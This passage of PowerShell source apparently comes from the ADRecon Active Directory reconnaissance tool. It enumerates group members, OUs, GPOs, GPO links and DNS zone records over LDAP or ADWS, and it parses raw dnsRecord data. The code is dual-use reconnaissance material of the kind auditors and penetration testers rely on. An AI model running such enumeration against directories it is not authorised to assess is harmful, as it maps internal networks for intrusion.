            Write-Verbose "[*] Total GroupMember Objects: $([ADRecon.ADWSClass]::ObjectCount($ADGroupMembers))"
            $GroupMemberObj = [ADRecon.ADWSClass]::GroupMemberParser($ADGroups, $ADGroupMembers, $ADDomainSID, $Threads)
            Remove-Variable ADGroups
            Remove-Variable ADGroupMembers
            Remove-Variable ADDomainSID
        }
    }

    If ($Protocol -eq 'LDAP')
    {

        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $DomainFQDN = Get-DNtoFQDN($objDomain.distinguishedName)
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("Domain",$($DomainFQDN),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
            Try
            {
                $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            Catch
            {
                Write-Warning "[Get-ADRGroupMember] Error getting Domain Context"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                Return $null
            }
            Remove-Variable DomainContext
            Try
            {
                $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("Forest",$($ADDomain.Forest),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
                $ADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            Catch
            {
                Write-Warning "[Get-ADRGroupMember] Error getting Forest Context"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            }
            If ($ForestContext)
            {
                Remove-Variable ForestContext
            }
            If ($ADForest)
            {
                $GlobalCatalog = $ADForest.FindGlobalCatalog()
            }
            If ($GlobalCatalog)
            {
                $DN = "GC://$($GlobalCatalog.IPAddress)/$($objDomain.distinguishedname)"
                Try
                {
                    $ADObject = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList ($($DN),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
                    $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($ADObject.objectSid[0], 0)
                    $ADObject.Dispose()
                }
                Catch
                {
                    Write-Warning "[Get-ADRGroupMember] Error retrieving Domain SID using the GlobalCatalog $($GlobalCatalog.IPAddress). Using SID from the ObjDomain."
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                    $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($objDomain.objectSid[0], 0)
                }
            }
            Else
            {
                $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($objDomain.objectSid[0], 0)
            }
        }
        Else
        {
            $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $ADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
            Try
            {
                $GlobalCatalog = $ADForest.FindGlobalCatalog()
                $DN = "GC://$($GlobalCatalog)/$($objDomain.distinguishedname)"
                $ADObject = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList ($DN)
                $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($ADObject.objectSid[0], 0)
                $ADObject.dispose()
            }
            Catch
            {
                Write-Warning "[Get-ADRGroupMember] Error retrieving Domain SID using the GlobalCatalog $($GlobalCatalog.IPAddress). Using SID from the ObjDomain."
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($objDomain.objectSid[0], 0)
            }
        }

        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(objectClass=group)"
        $ObjSearcher.PropertiesToLoad.AddRange(("samaccountname", "objectsid"))
        $ObjSearcher.SearchScope = "Subtree"

        Try
        {
            $ADGroups = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRGroupMember] Error while enumerating Group Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(|(memberof=*)(primarygroupid=*))"
        $ObjSearcher.PropertiesToLoad.AddRange(("distinguishedname", "dnshostname", "primarygroupid", "memberof", "samaccountname", "samaccounttype"))
        $ObjSearcher.SearchScope = "Subtree"

        Try
        {
            $ADGroupMembers = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRGroupMember] Error while enumerating GroupMember Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        If ( ($ADDomainSID) -and ($ADGroups) -and ($ADGroupMembers) )
        {
            Write-Verbose "[*] Total GroupMember Objects: $([ADRecon.LDAPClass]::ObjectCount($ADGroupMembers))"
            $GroupMemberObj = [ADRecon.LDAPClass]::GroupMemberParser($ADGroups, $ADGroupMembers, $ADDomainSID, $Threads)
            Remove-Variable ADGroups
            Remove-Variable ADGroupMembers
            Remove-Variable ADDomainSID
        }
    }

    If ($GroupMemberObj)
    {
        Return $GroupMemberObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADROU
{

    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADOUs = @( Get-ADOrganizationalUnit -Filter * -Properties DistinguishedName,Description,Name,whenCreated,whenChanged )
        }
        Catch
        {
            Write-Warning "[Get-ADROU] Error while enumerating OU Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ($ADOUs)
        {
            Write-Verbose "[*] Total OUs: $([ADRecon.ADWSClass]::ObjectCount($ADOUs))"
            $OUObj = [ADRecon.ADWSClass]::OUParser($ADOUs, $Threads)
            Remove-Variable ADOUs
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(objectclass=organizationalunit)"
        $ObjSearcher.PropertiesToLoad.AddRange(("distinguishedname","description","name","whencreated","whenchanged"))
        $ObjSearcher.SearchScope = "Subtree"

        Try
        {
            $ADOUs = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADROU] Error while enumerating OU Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADOUs)
        {
            Write-Verbose "[*] Total OUs: $([ADRecon.LDAPClass]::ObjectCount($ADOUs))"
            $OUObj = [ADRecon.LDAPClass]::OUParser($ADOUs, $Threads)
            Remove-Variable ADOUs
        }
    }

    If ($OUObj)
    {
        Return $OUObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRGPO
{

    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADGPOs = @( Get-ADObject -LDAPFilter '(objectCategory=groupPolicyContainer)' -Properties DisplayName,DistinguishedName,Name,gPCFileSysPath,whenCreated,whenChanged )
        }
        Catch
        {
            Write-Warning "[Get-ADRGPO] Error while enumerating groupPolicyContainer Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ($ADGPOs)
        {
            Write-Verbose "[*] Total GPOs: $([ADRecon.ADWSClass]::ObjectCount($ADGPOs))"
            $GPOsObj = [ADRecon.ADWSClass]::GPOParser($ADGPOs, $Threads)
            Remove-Variable ADGPOs
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(objectCategory=groupPolicyContainer)"
        $ObjSearcher.SearchScope = "Subtree"

        Try
        {
            $ADGPOs = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRGPO] Error while enumerating groupPolicyContainer Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADGPOs)
        {
            Write-Verbose "[*] Total GPOs: $([ADRecon.LDAPClass]::ObjectCount($ADGPOs))"
            $GPOsObj = [ADRecon.LDAPClass]::GPOParser($ADGPOs, $Threads)
            Remove-Variable ADGPOs
        }
    }

    If ($GPOsObj)
    {
        Return $GPOsObj
    }
    Else
    {
        Return $null
    }
}


Function Get-ADRGPLink
{

    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADSOMs = @( Get-ADObject -LDAPFilter '(|(objectclass=domain)(objectclass=organizationalUnit))' -Properties DistinguishedName,Name,gPLink,gPOptions )
            $ADSOMs += @( Get-ADObject -SearchBase "CN=Sites,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter "(objectclass=site)" -Properties DistinguishedName,Name,gPLink,gPOptions )
        }
        Catch
        {
            Write-Warning "[Get-ADRGPLink] Error while enumerating SOM Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        Try
        {
            $ADGPOs = @( Get-ADObject -LDAPFilter '(objectCategory=groupPolicyContainer)' -Properties DisplayName,DistinguishedName )
        }
        Catch
        {
            Write-Warning "[Get-ADRGPLink] Error while enumerating groupPolicyContainer Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ( ($ADSOMs) -and ($ADGPOs) )
        {
            Write-Verbose "[*] Total SOMs: $([ADRecon.ADWSClass]::ObjectCount($ADSOMs))"
            $SOMObj = [ADRecon.ADWSClass]::SOMParser($ADGPOs, $ADSOMs, $Threads)
            Remove-Variable ADSOMs
            Remove-Variable ADGPOs
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $ADSOMs = @()
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(|(objectclass=domain)(objectclass=organizationalUnit))"
        $ObjSearcher.PropertiesToLoad.AddRange(("distinguishedname","name","gplink","gpoptions"))
        $ObjSearcher.SearchScope = "Subtree"

        Try
        {
            $ADSOMs += $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRGPLink] Error while enumerating SOM Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        $SearchPath = "CN=Sites"
        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)", $Credential.UserName,$Credential.GetNetworkCredential().Password
        }
        Else
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)"
        }
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
        $ObjSearcher.Filter = "(objectclass=site)"
        $ObjSearcher.PropertiesToLoad.AddRange(("distinguishedname","name","gplink","gpoptions"))
        $ObjSearcher.SearchScope = "Subtree"

        Try
        {
            $ADSOMs += $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRGPLink] Error while enumerating SOM Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(objectCategory=groupPolicyContainer)"
        $ObjSearcher.SearchScope = "Subtree"

        Try
        {
            $ADGPOs = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRGPLink] Error while enumerating groupPolicyContainer Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        If ( ($ADSOMs) -and ($ADGPOs) )
        {
            Write-Verbose "[*] Total SOMs: $([ADRecon.LDAPClass]::ObjectCount($ADSOMs))"
            $SOMObj = [ADRecon.LDAPClass]::SOMParser($ADGPOs, $ADSOMs, $Threads)
            Remove-Variable ADSOMs
            Remove-Variable ADGPOs
        }
    }

    If ($SOMObj)
    {
        Return $SOMObj
    }
    Else
    {
        Return $null
    }
}


Function Convert-DNSRecord
{


    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Byte[]]
        $DNSRecord
    )

    BEGIN {
        Function Get-Name
        {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseOutputTypeCorrectly', '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Raw
            )

            [Int]$Length = $Raw[0]
            [Int]$Segments = $Raw[1]
            [Int]$Index =  2
            [String]$Name  = ''

            while ($Segments-- -gt 0)
            {
                [Int]$SegmentLength = $Raw[$Index++]
                while ($SegmentLength-- -gt 0)
                {
                    $Name += [Char]$Raw[$Index++]
                }
                $Name += "."
            }
            $Name
        }
    }

    PROCESS
    {

        $RDataType = [BitConverter]::ToUInt16($DNSRecord, 2)
        $UpdatedAtSerial = [BitConverter]::ToUInt32($DNSRecord, 8)

        $TTLRaw = $DNSRecord[12..15]


        $Null = [array]::Reverse($TTLRaw)
        $TTL = [BitConverter]::ToUInt32($TTLRaw, 0)

        $Age = [BitConverter]::ToUInt32($DNSRecord, 20)
        If ($Age -ne 0)
        {
            $TimeStamp = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours($age)).ToString()
        }
        Else
        {
            $TimeStamp = '[static]'
        }

        $DNSRecordObject = New-Object PSObject

        switch ($RDataType)
        {
            1
            {
                $IP = "{0}.{1}.{2}.{3}" -f $DNSRecord[24], $DNSRecord[25], $DNSRecord[26], $DNSRecord[27]
                $Data = $IP
                $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'A'
            }

            2
            {
                $NSName = Get-Name $DNSRecord[24..$DNSRecord.length]
                $Data = $NSName
                $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'NS'
            }

            5
            {
                $Alias = Get-Name $DNSRecord[24..$DNSRecord.length]
                $Data = $Alias
                $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'CNAME'
            }

            6
            {
                $PrimaryNS = Get-Name $DNSRecord[44..$DNSRecord.length]
                $ResponsibleParty = Get-Name $DNSRecord[$(46+$DNSRecord[44])..$DNSRecord.length]
                $SerialRaw = $DNSRecord[24..27]

                $Null = [array]::Reverse($SerialRaw)
                $Serial = [BitConverter]::ToUInt32($SerialRaw, 0)

                $RefreshRaw = $DNSRecord[28..31]
                $Null = [array]::Reverse($RefreshRaw)
                $Refresh = [BitConverter]::ToUInt32($RefreshRaw, 0)

                $RetryRaw = $DNSRecord[32..35]
                $Null = [array]::Reverse($RetryRaw)
                $Retry = [BitConverter]::ToUInt32($RetryRaw, 0)

                $ExpiresRaw = $DNSRecord[36..39]
                $Null = [array]::Reverse($ExpiresRaw)
                $Expires = [BitConverter]::ToUInt32($ExpiresRaw, 0)

                $MinTTLRaw = $DNSRecord[40..43]
                $Null = [array]::Reverse($MinTTLRaw)
                $MinTTL = [BitConverter]::ToUInt32($MinTTLRaw, 0)

                $Data = "[" + $Serial + "][" + $PrimaryNS + "][" + $ResponsibleParty + "][" + $Refresh + "][" + $Retry + "][" + $Expires + "][" + $MinTTL + "]"
                $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'SOA'
            }

            12
            {
                $Ptr = Get-Name $DNSRecord[24..$DNSRecord.length]
                $Data = $Ptr
                $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'PTR'
            }

            13
            {
                [string]$CPUType = ""
                [string]$OSType  = ""
                [int]$SegmentLength = $DNSRecord[24]
                $Index = 25
                while ($SegmentLength-- -gt 0)
                {
                    $CPUType += [char]$DNSRecord[$Index++]
                }
                $Index = 24 + $DNSRecord[24] + 1
                [int]$SegmentLength = $Index++
                while ($SegmentLength-- -gt 0)
                {
                    $OSType += [char]$DNSRecord[$Index++]
                }
                $Data = "[" + $CPUType + "][" + $OSType + "]"
                $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'HINFO'
            }

            15
            {
                $PriorityRaw = $DNSRecord[24..25]

                $Null = [array]::Reverse($PriorityRaw)
                $Priority = [BitConverter]::ToUInt16($PriorityRaw, 0)
                $MXHost   = Get-Name $DNSRecord[26..$DNSRecord.length]
                $Data = "[" + $Priority + "][" + $MXHost + "]"
                $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'MX'
            }

            16
            {
                [string]$TXT  = ''
                [int]$SegmentLength = $DNSRecord[24]
                $Index = 25
                while ($SegmentLength-- -gt 0)
                {
                    $TXT += [char]$DNSRecord[$Index++]
                }
                $Data = $TXT
                $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'TXT'
            }

            28
            {

                $AAAA = ""
                for ($i = 24; $i -lt 40; $i+=2)
                {
                    $BlockRaw = $DNSRecord[$i..$($i+1)]

                    $Null = [array]::Reverse($BlockRaw)
                    $Block = [BitConverter]::ToUInt16($BlockRaw, 0)
			        $AAAA += ($Block).ToString('x4')
			        If ($i -ne 38)
                    {
                        $AAAA += ':'
                    }
                }
                $Data = $AAAA
                $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'AAAA'
            }

            33
            {
                $PriorityRaw = $DNSRecord[24..25]

                $Null = [array]::Reverse($PriorityRaw)
                $Priority = [BitConverter]::ToUInt16($PriorityRaw, 0)

                $WeightRaw = $DNSRecord[26..27]
                $Null = [array]::Reverse($WeightRaw)
                $Weight = [BitConverter]::ToUInt16($WeightRaw, 0)

                $PortRaw = $DNSRecord[28..29]
                $Null = [array]::Reverse($PortRaw)
                $Port = [BitConverter]::ToUInt16($PortRaw, 0)

                $SRVHost = Get-Name $DNSRecord[30..$DNSRecord.length]
                $Data = "[" + $Priority + "][" + $Weight + "][" + $Port + "][" + $SRVHost + "]"
                $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'SRV'
            }

            default
            {
                $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
                $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'UNKNOWN'
            }
        }
        $DNSRecordObject | Add-Member Noteproperty 'UpdatedAtSerial' $UpdatedAtSerial
        $DNSRecordObject | Add-Member Noteproperty 'TTL' $TTL
        $DNSRecordObject | Add-Member Noteproperty 'Age' $Age
        $DNSRecordObject | Add-Member Noteproperty 'TimeStamp' $TimeStamp
        $DNSRecordObject | Add-Member Noteproperty 'Data' $Data
        Return $DNSRecordObject
    }
}

Function Get-ADRDNSZone
{

    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $true)]
        [string] $ADROutputDir,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [string] $DomainController,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $true)]
        [array] $OutputType
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADDNSZones = Get-ADObject -LDAPFilter '(objectClass=dnsZone)' -Properties Name,whenCreated,whenChanged,usncreated,usnchanged,distinguishedname
        }
        Catch
        {
            Write-Warning "[Get-ADRDNSZone] Error while enumerating dnsZone Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        }

        $DNSZoneArray = @()
        If ($ADDNSZones)
        {
            $DNSZoneArray += $ADDNSZones
            Remove-Variable ADDNSZones
        }

        Try
        {
            $ADDNSZones1 = Get-ADObject -LDAPFilter '(objectClass=dnsZone)' -SearchBase "DC=DomainDnsZones,$((Get-ADDomain).DistinguishedName)" -Properties Name,whenCreated,whenChanged,usncreated,usnchanged,distinguishedname
        }
        Catch
        {
            Write-Warning "[Get-ADRDNSZone] Error while enumerating DomainDnsZones dnsZone Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        }
        If ($ADDNSZones1)
        {
            $DNSZoneArray += $ADDNSZones1
            Remove-Variable ADDNSZones1
        }

        Try
        {
            $ADDNSZones2 = Get-ADObject -LDAPFilter '(objectClass=dnsZone)' -SearchBase "DC=ForestDnsZones,$((Get-ADDomain).DistinguishedName)" -Properties Name,whenCreated,whenChanged,usncreated,usnchanged,distinguishedname
        }
        Catch
        {
            Write-Warning "[Get-ADRDNSZone] Error while enumerating DC=ForestDnsZones,$((Get-ADDomain).DistinguishedName) dnsZone Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        }
        If ($ADDNSZones2)
        {
            $DNSZoneArray += $ADDNSZones2
            Remove-Variable ADDNSZones2
        }

        Write-Verbose "[*] Total DNS Zones: $([ADRecon.ADWSClass]::ObjectCount($DNSZoneArray))"

        If ($DNSZoneArray)
        {
            $ADDNSZonesObj = @()
            $ADDNSNodesObj = @()
            $DNSZoneArray | ForEach-Object {

                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name Name -Value $([ADRecon.ADWSClass]::CleanString($_.Name))
                Try
                {
                    $DNSNodes = Get-ADObject -SearchBase $($_.DistinguishedName) -LDAPFilter '(objectClass=dnsNode)' -Properties DistinguishedName,dnsrecord,dNSTombstoned,Name,ProtectedFromAccidentalDeletion,showInAdvancedViewOnly,whenChanged,whenCreated
                }
                Catch
                {
                    Write-Warning "[Get-ADRDNSZone] Error while enumerating $($_.DistinguishedName) dnsNode Objects"
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                }
                If ($DNSNodes)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name RecordCount -Value $($DNSNodes | Measure-Object | Select-Object -ExpandProperty Count)
                    $DNSNodes | ForEach-Object {
                        $ObjNode = New-Object PSObject
                        $ObjNode | Add-Member -MemberType NoteProperty -Name ZoneName -Value $Obj.Name
                        $ObjNode | Add-Member -MemberType NoteProperty -Name Name -Value $_.Name
                        Try
                        {
                            $DNSRecord = Convert-DNSRecord $_.dnsrecord[0]
                        }
                        Catch
                        {
                            Write-Warning "[Get-ADRDNSZone] Error while converting the DNSRecord"
                            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                        }
                        $ObjNode | Add-Member -MemberType NoteProperty -Name RecordType -Value $DNSRecord.RecordType
                        $ObjNode | Add-Member -MemberType NoteProperty -Name Data -Value $DNSRecord.Data
                        $ObjNode | Add-Member -MemberType NoteProperty -Name TTL -Value $DNSRecord.TTL
                        $ObjNode | Add-Member -MemberType NoteProperty -Name Age -Value $DNSRecord.Age
                        $ObjNode | Add-Member -MemberType NoteProperty -Name TimeStamp -Value $DNSRecord.TimeStamp
                        $ObjNode | Add-Member -MemberType NoteProperty -Name UpdatedAtSerial -Value $DNSRecord.UpdatedAtSerial
                        $ObjNode | Add-Member -MemberType NoteProperty -Name whenCreated -Value $_.whenCreated
                        $ObjNode | Add-Member -MemberType NoteProperty -Name whenChanged -Value $_.whenChanged



                        $ObjNode | Add-Member -MemberType NoteProperty -Name showInAdvancedViewOnly -Value $_.showInAdvancedViewOnly
                        $ObjNode | Add-Member -MemberType NoteProperty -Name DistinguishedName -Value $_.DistinguishedName
                        $ADDNSNodesObj += $ObjNode
                        If ($DNSRecord)
                        {
                            Remove-Variable DNSRecord
                        }
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name RecordCount -Value $null
                }
                $Obj | Add-Member -MemberType NoteProperty -Name USNCreated -Value $_.usncreated
                $Obj | Add-Member -MemberType NoteProperty -Name USNChanged -Value $_.usnchanged
                $Obj | Add-Member -MemberType NoteProperty -Name whenCreated -Value $_.whenCreated
                $Obj | Add-Member -MemberType NoteProperty -Name whenChanged -Value $_.whenChanged
                $Obj | Add-Member -MemberType NoteProperty -Name DistinguishedName -Value $_.DistinguishedName
                $ADDNSZonesObj += $Obj
            }
            Write-Verbose "[*] Total DNS Records: $([ADRecon.ADWSClass]::ObjectCount($ADDNSNodesObj))"
            Remove-Variable DNSZoneArray
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.PropertiesToLoad.AddRange(("name","whencreated","whenchanged","usncreated","usnchanged","distinguishedname"))
        $ObjSearcher.Filter = "(objectClass=dnsZone)"
        $ObjSearcher.SearchScope = "Subtree"

        Try
        {
            $ADDNSZones = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRDNSZone] Error while enumerating dnsZone Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        }
        $ObjSearcher.dispose()

        $DNSZoneArray = @()
        If ($ADDNSZones)
        {
            $DNSZoneArray += $ADDNSZones
            Remove-Variable ADDNSZones
        }

        $SearchPath = "DC=DomainDnsZones"
        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($SearchPath),$($objDomain.distinguishedName)", $Credential.UserName,$Credential.GetNetworkCredential().Password
        }
        Else
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($SearchPath),$($objDomain.distinguishedName)"
        }
        $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
        $objSearcherPath.Filter = "(objectClass=dnsZone)"
        $objSearcherPath.PageSize = $PageSize
        $objSearcherPath.PropertiesToLoad.AddRange(("name","whencreated","whenchanged","usncreated","usnchanged","distinguishedname"))
        $objSearcherPath.SearchScope = "Subtree"

        Try
        {
            $ADDNSZones1 = $objSearcherPath.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRDNSZone] Error while enumerating DomainDnsZones dnsZone Objects."
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        }
        $objSearcherPath.dispose()

        If ($ADDNSZones1)
        {
            $DNSZoneArray += $ADDNSZones1
            Remove-Variable ADDNSZones1
        }

        $SearchPath = "DC=ForestDnsZones"
        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($SearchPath),$($objDomain.distinguishedName)", $Credential.UserName,$Credential.GetNetworkCredential().Password
        }
        Else
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($SearchPath),$($objDomain.distinguishedName)"
        }
        $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
        $objSearcherPath.Filter = "(objectClass=dnsZone)"
        $objSearcherPath.PageSize = $PageSize
        $objSearcherPath.PropertiesToLoad.AddRange(("name","whencreated","whenchanged","usncreated","usnchanged","distinguishedname"))
        $objSearcherPath.SearchScope = "Subtree"

        Try
        {
            $ADDNSZones2 = $objSearcherPath.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRDNSZone] Error while enumerating ForestDnsZones dnsZone Objects."
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        }
        $objSearcherPath.dispose()

        If ($ADDNSZones2)
        {
            $DNSZoneArray += $ADDNSZones2
            Remove-Variable ADDNSZones2
        }

        Write-Verbose "[*] Total DNS Zones: $([ADRecon.LDAPClass]::ObjectCount($DNSZoneArray))"

        If ($DNSZoneArray)
        {
            $ADDNSZonesObj = @()
            $ADDNSNodesObj = @()
            $DNSZoneArray | ForEach-Object {
                If ($Credential -ne [Management.Automation.PSCredential]::Empty)
                {
                    $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($_.Properties.distinguishedname)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                }
                Else
                {
                    $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($_.Properties.distinguishedname)"
                }
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
                $objSearcherPath.Filter = "(objectClass=dnsNode)"
                $objSearcherPath.PageSize = $PageSize
                $objSearcherPath.PropertiesToLoad.AddRange(("distinguishedname","dnsrecord","name","dc","showinadvancedviewonly","whenchanged","whencreated"))
                Try
                {
                    $DNSNodes = $objSearcherPath.FindAll()
                }
                Catch
                {
                    Write-Warning "[Get-ADRDNSZone] Error while enumerating $($_.Properties.distinguishedname) dnsNode Objects"
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                }
                $objSearcherPath.dispose()
                Remove-Variable objSearchPath


                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name Name -Value $([ADRecon.LDAPClass]::CleanString($_.Properties.name[0]))
                If ($DNSNodes)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name RecordCount -Value $($DNSNodes | Measure-Object | Select-Object -ExpandProperty Count)
                    $DNSNodes | ForEach-Object {
                        $ObjNode = New-Object PSObject
                        $ObjNode | Add-Member -MemberType NoteProperty -Name ZoneName -Value $Obj.Name
                        $name = ([string] $($_.Properties.name))
                        If (-Not $name)
                        {
                            $name = ([string] $($_.Properties.dc))
                        }
